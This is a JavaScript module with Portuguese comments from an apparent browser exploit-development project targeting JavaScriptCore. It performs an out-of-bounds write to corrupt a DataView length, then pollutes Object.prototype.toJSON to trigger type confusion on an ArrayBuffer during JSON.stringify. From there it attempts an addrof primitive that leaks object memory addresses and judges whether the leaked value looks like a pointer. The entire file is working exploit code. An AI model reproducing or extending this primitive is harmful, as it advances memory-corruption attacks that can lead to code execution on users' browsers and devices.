// NOME DO ARQUIVO: develop_addrof_primitive.mjs (Baseado na Heisenbug estável observada)
// Localização: js/script3/develop_addrof_primitive.mjs

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    // oob_dataview_real, // Não diretamente usado aqui, mas configurado por triggerOOB_primitive
    oob_write_absolute,
    // oob_read_absolute, // Não diretamente usado aqui para a lógica principal do addrof
    clearOOBEnvironment,
    // Não vamos mais chamar getStableConfusedArrayBuffer, vamos replicar a lógica aqui.
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ADDROF_DEV = "StableHeisenbug_AddrofAttempt_v1";

// Offset da corrupção OOB crítica que aciona a Heisenbug.
// Conforme os logs do core_exploit.selfTestTypeConfusionAndMemoryControl e ArrayBufferVictimCrashTest_v28.trigger
// o alvo funcional é 0x7C.
// (Base 0x58 + M_LENGTH_OFFSET 0x24 = 0x7C).
// Este é o m_length do oob_dataview_real (que tem seus metadados em 0x58 dentro do oob_array_buffer_real)
const HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C; // <- Importante!
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE = 64; // Tamanho usado no testArrayBufferVictimCrash.mjs

// Variáveis globais para a sonda toJSON principal
let object_to_leak_addr_ref = null;
let heisenbug_confirmed_in_probe = false;
let this_type_observed_in_probe = "";

// Renomeando a função exportada para manter a chamada no runAllAdvancedTestsS3.mjs,
// mas o FNAME_MODULE_ADDROF_DEV indica o propósito atual.
export async function attemptDevelopAddrofPrimitive() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_ADDROF_DEV}.attempt`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Addrof sobre Heisenbug Estabilizada ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_ADDROF_DEV} Inic...`;

    let result = {
        success: false,
        message: "Não iniciado",
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        heisenbug_observed_in_main_probe: false,
        main_probe_this_type: ""
    };

    // Resetar variáveis globais do teste
    object_to_leak_addr_ref = { dataA: 0xABCDEF01, dataB: 0x12345678, id: "TargetObjForAddrof" };
    heisenbug_confirmed_in_probe = false;
    this_type_observed_in_probe = "";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedToJSON = false;
    let victim_ab = null; // O ArrayBuffer que será nossa vítima da Heisenbug
    let float64_view_on_victim = null;

    try {
        // PASSO 0: Configurar ambiente OOB
        await triggerOOB_primitive({ force_reinit: true }); // Forçar re-init para um estado limpo
        if (!oob_array_buffer_real || !oob_write_absolute) {
            throw new Error("OOB Init ou oob_write_absolute falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        // PASSO 1: Realizar a escrita OOB crítica que aciona a Heisenbug
        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(HEISENBUG_CRITICAL_WRITE_VALUE)} em oob_array_buffer_real[${toHex(HEISENBUG_CRITICAL_WRITE_OFFSET)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica em ${toHex(HEISENBUG_CRITICAL_WRITE_OFFSET)} realizada.`, "info", FNAME_CURRENT_TEST);
        
        await PAUSE_S3(100); // Pausa crucial, como no testArrayBufferVictimCrash.mjs

        // PASSO 2: Criar ArrayBuffer vítima e sua view
        victim_ab = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE);
        float64_view_on_victim = new Float64Array(victim_ab);
        float64_view_on_victim.fill(0.987654321); // Preencher com um padrão diferente
        logS3(`  victim_ab (tamanho ${HEISENBUG_VICTIM_AB_SIZE}) e float64_view_on_victim criados. View[0] inicial: ${float64_view_on_victim[0]}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Objeto alvo para vazar endereço: ${JSON.stringify(object_to_leak_addr_ref)}`, "info", FNAME_CURRENT_TEST);


        // PASSO 3: Poluir Object.prototype.toJSON e chamar JSON.stringify no victim_ab
        logS3("PASSO 3: Poluindo Object.prototype.toJSON e chamando JSON.stringify no victim_ab...", "warn", FNAME_CURRENT_TEST);
        
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
        pollutedToJSON = false; 

        Object.defineProperty(Object.prototype, 'toJSON', {
            writable: true, configurable: true, enumerable: false,
            value: function HeisenbugExploitProbe() {
                this_type_observed_in_probe = Object.prototype.toString.call(this);
                
                if (this === victim_ab) { // A sonda está operando sobre nosso objeto vítima
                    logS3(`[HeisenbugExploitProbe] 'this' é victim_ab. Tipo de 'this' observado: ${this_type_observed_in_probe}`, "leak", FNAME_CURRENT_TEST + "_Probe");
                    if (this_type_observed_in_probe === '[object Object]') {
                        heisenbug_confirmed_in_probe = true;
                        logS3(`[HeisenbugExploitProbe] HEISENBUG CONFIRMADA: victim_ab é percebido como [object Object]!`, "vuln", FNAME_CURRENT_TEST + "_Probe");
                        
                        try {
                            logS3(`[HeisenbugExploitProbe] Tentando escrever object_to_leak_addr_ref em this[0]...`, "warn", FNAME_CURRENT_TEST + "_Probe");
                            this[0] = object_to_leak_addr_ref; // A escrita crucial
                            logS3(`[HeisenbugExploitProbe] Escrita em this[0] (supostamente) realizada.`, "info", FNAME_CURRENT_TEST + "_Probe");
                        } catch (e_prop_write) {
                            logS3(`[HeisenbugExploitProbe] ERRO ao tentar escrever propriedade 'this[0]': ${e_prop_write.name} - ${e_prop_write.message}`, "error", FNAME_CURRENT_TEST + "_Probe");
                        }
                    } else {
                        logS3(`[HeisenbugExploitProbe] 'this' é victim_ab, mas o tipo é ${this_type_observed_in_probe} (NÃO [object Object]). Heisenbug não ocorreu.`, "error", FNAME_CURRENT_TEST + "_Probe");
                    }
                }
                // Retorno similar ao toJSON_V28_MinimalProbe para compatibilidade com o fluxo esperado por JSON.stringify
                return { minimal_probe_executed: true, type_is: this_type_observed_in_probe };
            }
        });
        pollutedToJSON = true;

        let stringify_output = "N/A";
        try {
            logS3(`  Chamando JSON.stringify(victim_ab)... (Ponto esperado da Heisenbug)`, "warn", FNAME_CURRENT_TEST);
            stringify_output = JSON.stringify(victim_ab);
            logS3(`  JSON.stringify(victim_ab) completou. Saída (da sonda): ${stringify_output}`, "info", FNAME_CURRENT_TEST);
        } catch(e_stringify) {
            logS3(`  ERRO durante JSON.stringify(victim_ab): ${e_stringify.name} - ${e_stringify.message}`, "error", FNAME_CURRENT_TEST);
        }
        
        result.heisenbug_observed_in_main_probe = heisenbug_confirmed_in_probe;
        result.main_probe_this_type = this_type_observed_in_probe;

        if (!heisenbug_confirmed_in_probe) {
            result.message = `Heisenbug (this como [object Object]) não foi confirmada na sonda toJSON para victim_ab. Tipo obs: ${this_type_observed_in_probe}`;
            logS3(`  ALERTA: ${result.message}`, "error", FNAME_CURRENT_TEST);
            // Não adianta prosseguir com a leitura se a Heisenbug não ocorreu.
        } else {
            logS3(`PASSO 4: Verificando float64_view_on_victim[0] APÓS JSON.stringify e Heisenbug confirmada...`, "warn", FNAME_CURRENT_TEST);
            const value_read_as_double = float64_view_on_victim[0];
            result.leaked_address_as_double = value_read_as_double;
            logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);

            const double_buffer_for_conversion = new ArrayBuffer(8);
            const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
            const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
            double_view_for_conversion[0] = value_read_as_double;
            result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
            logS3(`  Interpretado como Int64: ${result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);

            if (value_read_as_double !== 0 && value_read_as_double !== 0.987654321 && // Não é zero nem o preenchimento
                (result.leaked_address_as_int64.high() < 0x00020000 || (result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                result.success = true;
                result.message = "Heisenbug confirmada E leitura de double sugere um ponteiro.";
                document.title = `${FNAME_MODULE_ADDROF_DEV}: Addr? ${result.leaked_address_as_int64.toString(true)}`;
            } else {
                result.message = "Heisenbug confirmada, mas valor lido não parece ponteiro ou buffer não foi alterado.";
                logS3(`  INFO: ${result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                document.title = `${FNAME_MODULE_ADDROF_DEV}: Heisenbug OK, Addr Falhou`;
            }
        }

    } catch (e_main) {
        logS3(`ERRO CRÍTICO no ${FNAME_CURRENT_TEST}: ${e_main.name} - ${e_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_main.stack) logS3(`Stack: ${e_main.stack}`, "critical", FNAME_CURRENT_TEST);
        result.message = `Erro crítico: ${e_main.message}`;
        document.title = `${FNAME_MODULE_ADDROF_DEV}: ERRO CRITICO`;
    } finally {
        if (pollutedToJSON) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptor);
            else delete Object.prototype.toJSON;
        }
        clearOOBEnvironment();
        object_to_leak_addr_ref = null; 
        victim_ab = null;
        float64_view_on_victim = null;

        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Final: Success=${result.success}, Msg='${result.message}'`, result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`  Heisenbug Observada nesta Sonda: ${result.heisenbug_observed_in_main_probe}`, "info", FNAME_CURRENT_TEST);
        logS3(`  Tipo de 'this' observado na sonda: '${result.main_probe_this_type}'`, "info", FNAME_CURRENT_TEST);
        if (result.leaked_address_as_int64) {
            logS3(`  Valor lido como Int64: ${result.leaked_address_as_int64.toString(true)} (Double: ${result.leaked_address_as_double})`, "leak", FNAME_CURRENT_TEST);
        }
    }
    return result;
}
